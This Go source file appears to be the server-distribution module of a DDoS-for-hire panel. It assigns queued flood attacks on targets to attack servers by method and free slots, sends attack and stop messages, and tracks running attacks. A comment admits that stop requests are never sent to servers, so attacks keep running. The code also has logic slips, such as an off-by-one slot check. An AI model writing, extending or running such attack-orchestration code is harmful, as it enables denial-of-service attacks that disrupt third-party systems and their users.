package servers

import (
	"api/core/models/apis"
	"api/core/models/floods"
	"fmt"
	"math"
	"net"
	"strings"
    "slices"
	"time"
)

type Server struct {
	Name      string
	Type      int
	Slots     int
	running   int
	CurrentID int
  Methods   []string
	attacks   map[int]*floods.Attack
	Queue     chan *floods.Attack
	StopQueue chan string
	conn      net.Conn
	ResponseTime float64
}

func (server *Server) Load() float64 {
	return toFixed(((float64(server.running) / float64(server.Slots)) * 100), 2)
}

func New(conn net.Conn) *Server {
	return &Server{
		attacks:   make(map[int]*floods.Attack, 0),
		conn:      conn,
		CurrentID: 0,
		Queue:     make(chan *floods.Attack, 30),
	}
}

func (s *Server) RemoteAddr() string {
	return strings.Split(s.conn.RemoteAddr().String(), ":")[0]
}

func (s *Server) Read(buf []byte) (int, error) {
	return s.conn.Read(buf)
}

func (s *Server) Running() int {
	return s.running
}

func SelectHandler(atk *floods.Attack) (*Server, error) {
    if len(Servers) == 0 {
        return nil, fmt.Errorf("no servers available")
    }

    var load []int = make([]int, 0)
    for _, server := range Servers {
        if server.running == server.Slots {
            continue
        }
        if contains(server.Methods, atk.Sname) {
            load = append(load, server.running)
        }
    }

    // If no servers can handle the method, return an error
    if len(load) == 0 {
        return nil, fmt.Errorf("no servers available with method %s", atk.Sname)
    }

    min := slices.Min(load)

    // Find and return the server with the minimum load that supports the attack method
    for _, server := range Servers {
        if server.running == server.Slots {
            continue
        }
        if server.running == min && contains(server.Methods, atk.Sname) {
            return server, nil
        }
    }

    return nil, fmt.Errorf("no suitable server found for method %s", atk.Sname)
}


func (s *Server) KeepAlive() {
	ticker := time.NewTicker(10 * time.Second)
	for {
		select {
		case atk, ok := <-s.Queue:
			if !ok {
				continue
			}
			if (s.running + 1) == s.Slots {
				continue
			}
			logger.Println("starting attack on \"" + atk.Target + "\" with server \"" + s.Name + "\"")
			s.NewMessage(MessageAttack, "")
			s.running++
			s.attacks[len(s.attacks)] = atk
			s.NewAttack(atk)
		case stop, ok := <-s.StopQueue:
			if !ok {
				continue
			}
			s.NewMessage(MessageStop, stop)
			logger.Println("stopped attack \"" + stop + "\"")
		case <-ticker.C:
			s.NewMessage(MessagePing, "ping!")
			msg, err := s.ReadMessage()
			if err != nil {
				return
			}
			if msg.ID != MessagePing {
				logger.Println("ping id mismatch!")
				return
			}
		default:
			time.Sleep(250 * time.Millisecond)
		}
	}
}
//added err check
func Distribute(atk *floods.Attack) error {
	fmt.Println("distributing attack across all servers!")
    handler, err := SelectHandler(atk)
    if err != nil {
        return err
    }
	if handler != nil {
		handler.Queue <- atk
	} else {
		for _, server := range Servers {
			if server.running < server.Slots && contains(server.Methods, atk.Sname) {
				server.Queue <- atk
			}
		}
	}
	return nil
}

func contains(methods []string, method string) bool {
    for _, m := range methods {
        if m == method {
            return true
        }
    }
    return false
}

func Stop(id int) {
    for _, server := range Servers {
        for attackID := range server.attacks {
            if attackID == id {
                delete(server.attacks, attackID)
                server.running--

                logger.Println("Stopped attack on target:", id)
                //server.NewMessage(MessageStop, id) yk i got lazy here who needs attaks to stop?
                return
            }
        }
    }

    // If the attack ID was not found, log a warning
    logger.Println("No ongoing attack found with ID:", id)
}

func Slots() map[int]int {
	var i map[int]int = make(map[int]int)
	for _, server := range Servers {
		i[server.Type] += server.Slots
		i[0] += server.Slots
	}
	i[0] += apis.Slots()
	logger.Println(i)
	return i
}

func (s *Server) Ongoing() {
	ticker := time.NewTicker(1 * time.Second)
	for {
		select {
		case <-ticker.C:
			for i, attack := range s.attacks {
				if attack.Created+int64(attack.Duration) == time.Now().Unix() {
					delete(s.attacks, i)
					s.running--
				}
			}
		}
	}
}

func round(num float64) int {
	return int(num + math.Copysign(0.5, num))
}

func toFixed(num float64, precision int) float64 {
	output := math.Pow(10, float64(precision))
	return float64(round(num*output)) / output
}

